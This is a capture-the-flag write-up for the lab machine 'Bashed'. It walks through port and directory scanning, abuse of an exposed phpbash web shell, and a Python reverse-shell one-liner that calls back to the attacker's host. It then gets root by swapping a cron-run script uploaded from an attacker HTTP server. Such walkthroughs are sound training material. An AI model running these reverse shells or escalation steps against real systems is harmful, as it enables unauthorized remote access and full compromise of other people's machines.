# Bashed


# Recon
```
Nmap scan report for 10.10.10.68
Host is up (0.13s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

```


Checking the website there's a mention to something called 'phpbash'

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.68/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/wordlists/small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2021/09/29 20:14:10 Starting gobuster
=====================================================
/css (Status: 301)
/dev (Status: 301)
/images (Status: 301)
/js (Status: 301)
/php (Status: 301)
/uploads (Status: 301)
=====================================================
2021/09/29 20:14:35 Finished
=====================================================
```

Checking out /dev/ we see:

```
/phpbash.mim.php
/phpbash.php
```

phpbash.php looks like a shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",64444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We get a shell
```
nc -lvnp 64444
Listening on 0.0.0.0 64444
Connection received on 10.10.10.68 49316
$ whoami
www-data
$ find /  -type f -name "user.txt" 2>/dev/null
/home/arrexel/user.txt
```

# Privilege escalation

```
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```


Aparently scriptmanager can be run sudo w/o passwd, this can be exploited to get a shell with root privileges

```
$ cd /
$ ls -la
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
drwxr-xr-x  19 root          root           4240 Sep 29 16:07 dev
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 113 root          root              0 Sep 29 16:07 proc
drwx------   3 root          root           4096 Dec  4  2017 root
drwxr-xr-x  18 root          root            500 Sep 29 16:08 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Sep 29 16:07 sys
drwxrwxrwt  10 root          root           4096 Sep 29 16:43 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Everything inside the root directory is owned by root, except the scripts folder which is owned by scriptmanager

```
$ sudo -i -u scriptmanager
whoami
scriptmanager
```

Checking the contents of /scripts, we see a python script that appears to be run regularly with a cron job
scriptmanager have rights to edit the python script, but, it is impossible to do it via shell, so it is better to upload your own version of it
```
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
cd /
cd scripts
ls
test.py
test.txt


ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep 29 16:49 test.txt
```

Uploading it
```
-m http.server 62000
Serving HTTP on 0.0.0.0 port 62000 (http://0.0.0.0:62000/) ...
10.10.10.68 - - [29/Sep/2021 20:57:12] "GET /test.py HTTP/1.1" 200 -

```
and get the shell

```
nc -lnvp 55555
Listening on 0.0.0.0 55555
Connection received on 10.10.10.68 59132
# whoami
root
# find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
```
